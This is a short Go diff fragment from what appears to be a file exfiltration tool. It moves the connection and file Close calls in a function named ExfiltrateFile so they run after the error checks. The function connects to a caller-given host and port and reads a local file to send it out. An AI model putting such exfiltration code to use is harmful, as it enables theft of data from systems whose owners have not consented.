@@ -26,18 +26,18 @@ func ExfiltrateFile(fileName, connHost, connPort string) error {
 
 	fmt.Printf("Connecting %s:%s over %s\n", connHost, connPort, connType)
 	conn, err := net.Dial(connType, connHost+":"+connPort)
-	defer conn.Close()
 	if err != nil {
 		fmt.Println(err.Error())
 		return fmt.Errorf("HostNotReachable: Not able to connect %s:%s", connHost, connPort)
 	}
-
+	defer conn.Close()
 	//transfer file
 	file, err := os.Open(fileName)
-	defer file.Close()
 	if err != nil {
 		return fmt.Errorf("FilePermission: Not able to read file %s", fileName)
 	}
+	defer file.Close()
+
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		var b = make([]byte, 2, 3)
